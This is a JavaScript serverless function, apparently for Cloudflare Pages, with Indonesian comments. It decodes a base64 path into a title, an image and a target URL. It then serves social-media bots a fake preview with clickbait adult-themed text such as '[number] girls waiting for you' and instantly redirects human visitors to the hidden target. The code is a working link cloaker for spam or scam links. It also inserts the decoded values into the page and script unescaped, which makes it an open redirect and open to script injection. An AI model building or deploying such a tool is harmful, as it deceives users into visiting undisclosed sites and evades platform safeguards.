export async function onRequest(context) {
    const { params } = context;
    const base64Data = params.path[0];

    // Jika tidak ada data base64, biarkan halaman normal terbuka
    if (!base64Data || base64Data === "index.html") {
        return context.next();
    }

    try {
        // Decode data dari URL
        const data = JSON.parse(atob(base64Data));
        const title = data.t || "Hot Video";
        const image = data.i || "";
        const target = data.u || "";

        // Logic Random Deskripsi (Dikerjakan di sisi server/path)
        const count = Math.floor(Math.random() * (100000 - 10000 + 1)) + 10000;
        const formattedCount = count.toLocaleString('en-US');
        const templates = [
            `${formattedCount} Girls ready for you`,
            `${formattedCount} girls waiting for you`
        ];
        const randomDesc = templates[Math.floor(Math.random() * templates.length)];

        // HTML Mentah untuk Bot WhatsApp/Facebook
        const html = `<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>${title}</title>
    
    <meta property="og:title" content="${title}" />
    <meta property="og:description" content="▶️ ${randomDesc}" />
    <meta property="og:image" content="${image}" />
    <meta property="og:type" content="video.other" />
    <meta property="og:image:width" content="1200" />
    <meta property="og:image:height" content="630" />
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content="${image}">

    <script>window.location.replace("${target.startsWith('http') ? target : 'https://' + target}");</script>
    <meta http-equiv="refresh" content="0;url=${target.startsWith('http') ? target : 'https://' + target}">
</head>
<body style="background:#000; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh;">
    <p>Redirecting...</p>
</body>
</html>`;

        return new Response(html, {
            headers: { "content-type": "text/html;charset=UTF-8" },
        });
    } catch (e) {
        return new Response("Invalid URL Data", { status: 400 });
    }
}
